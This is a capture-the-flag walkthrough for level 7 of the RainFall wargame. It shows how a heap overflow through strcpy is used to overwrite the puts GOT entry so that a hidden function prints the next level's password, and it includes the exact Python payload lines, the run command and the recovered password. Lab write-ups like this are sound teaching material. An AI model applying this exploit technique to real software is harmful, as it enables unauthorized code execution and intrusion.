
# RainFall Walkthrough — Level 7 → Level 8

## Step 1 — Initial Recon

We start as **level7**:

We inspect the binary protections upon connecting:

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7

``` 

## Step 2 — First Execution Tests

Running the binary:

```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 asdasdasd
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 asdasdasd asdasdasdasd
~~

```

The program crashes with **1 argument**, prints `~~` with **2 arguments**, and still behaves strangely with **3 arguments**. This suggests memory handling issues with the arguments.

## Step 3 — Disassembly in GDB

Open the binary in `gdb`:

```bash
gdb ./level7

```

List functions:

```bash
(gdb) info functions

```

We see:

-   `main` at `0x08048521`
    
-   A function `m` at `0x080484f4`
    

Disassembling `main` shows multiple calls to `malloc`, then two calls to `strcpy` that copy **argv[1]** and **argv[2]** into heap-allocated buffers.

At the end of `main`, the binary calls:

```c
fopen(".pass", "r");
fgets(buffer, 0x44, fp);
puts("~~");

```

So the program is clearly dealing with the **next level’s password file**.

## Step 4 — Global Variables

Inspecting variables:

```bash
(gdb) info variables
...
0x08049960  c

```

There’s a global variable `c` at `0x08049960`.

## Step 5 — Disassembling Function `m`

Disassembling `m`:

```asm
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>

```

This function prints something based on time, but most importantly **it prints the value stored in c** ! Meaning we need `m()` executed.

## Step 6 — GOT Overwrite Attack

Since **RELRO is disabled**, we can overwrite a **GOT entry** (Global Offset Table). Looking at relocations:

```bash
objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts

```

So `puts@GOT` is at **0x08049928**. If we overwrite this with the address of `m` (`0x080484f4`), any call to `puts` will instead execute `m()`.

## Step 7 — Crafting the Payload

We need two arguments:

-   **argv[1]** → long buffer overflow to reach and overwrite the return flow.
    
-   **argv[2]** → payload to overwrite GOT.
    

We build payloads:

```bash
python -c 'print "a" * 20 + "\x28\x99\x04\x08"' > /tmp/p1   # argv[1]
python -c 'print "\xf4\x84\x04\x08"' > /tmp/p2              # argv[2] (address of m)

```

Then run:

```bash
./level7 $(cat /tmp/p1) $(cat /tmp/p2)

```

## Step 8 — Success

The program prints:

```bash
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1756909538

```

That is the **password for level8**.

## Final Step — Verify

```bash
level7@RainFall:~$ su level8
Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

```


We now have access to **level8**! 
